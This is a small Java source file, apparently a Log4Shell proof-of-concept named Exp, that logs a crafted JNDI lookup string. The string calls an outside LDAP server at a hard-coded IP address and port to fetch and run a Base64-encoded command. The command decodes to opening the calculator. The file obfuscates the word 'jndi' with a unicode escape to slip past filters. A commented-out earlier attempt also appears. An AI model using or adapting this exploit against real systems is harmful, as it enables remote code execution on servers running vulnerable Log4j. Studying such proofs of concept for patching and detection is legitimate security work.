package com.xq17.Log4jDemo;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
import java.net.URI;
import java.net.URISyntaxException;

public class Exp {

    // Define a static logger variable so that it references the
    // Logger instance named "MyApp".
    //private static final Logger logger = LogManager.getLogger(Exp.class);
    private static final Logger logger = LogManager.getRootLogger();

    public static void main(final String... args) {

        // Set up a simple configuration that logs on the console.
        /*
        logger.trace("Entering application.");
        String name = "jndi:ldap://111.230.197.23:9090/Type=111&Name=1100110&Char=!";
        try{
            URI uri = new URI(name);
            System.out.println(uri.getScheme());}

        catch (URISyntaxException ex) {x
            //ok
        }
        System.out.println(name);;
        //logger.error(name);
        */
        String jndi= "\\u" + "006andi";
        logger.error("${"+ jndi +":ldap://111.230.197.23:9090/Basic/Command/Base64/b3BlbiAtYSBjYWxjdWxhdG9yLmFwcA==}");
    }
}